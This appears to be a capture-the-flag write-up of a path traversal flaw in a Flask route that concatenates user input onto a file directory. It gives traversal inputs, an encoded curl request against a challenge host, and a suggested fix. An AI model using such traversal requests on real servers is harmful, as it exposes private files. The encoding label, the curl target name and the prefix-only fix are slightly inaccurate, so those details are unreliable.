# 🔍 Key Line of Vulnerability

```python
requested_path = app.root_path + "/files/" + path
```
`app.root_path` is the path to the directory where the Flask app lives (likely `/challenge/`).

It naively appends user input (`path`) to this, without sanitization.

So if `path = "../../flag.txt"`, then:

```ini
requested_path = "/challenge/files/../../flag.txt"
```
Which resolves to:

```bash
/challenge/flag.txt
```

✔️ That’s classic path traversal!

## 🧪 Exploit Strategy

You're interacting with `/docs/<path>`, and the server internally tries to serve:

```bash
/challenge/files/<path>
```
If you send `../../flag.txt`, the resolved path becomes:

```bash
/challenge/files/../../flag.txt → /challenge/flag.txt
```

Try encoded variants if the above fails (depending on Flask version, it may normalize `/../`):

Double URL encoded:

```bash
curl -v "http://challenge.localhost/docs/%2e%2e/%2e%2e/flag"
```

## 📌 Important Observations

- The app does not use `os.path.realpath()` or `os.path.abspath()` to canonicalize the path.
- It directly concatenates strings, which is a bad security practice.
- Flask’s `<path:path>` route allows slashes, so it won’t block `../`.

## 🛡️ Defensive Notes (just for your awareness)

To prevent such vulnerabilities, developers should:

```python
safe_base = os.path.realpath(app.root_path + "/files")
requested_path = os.path.realpath(os.path.join(safe_base, path))

if not requested_path.startswith(safe_base):
    flask.abort(403)  # Forbidden
```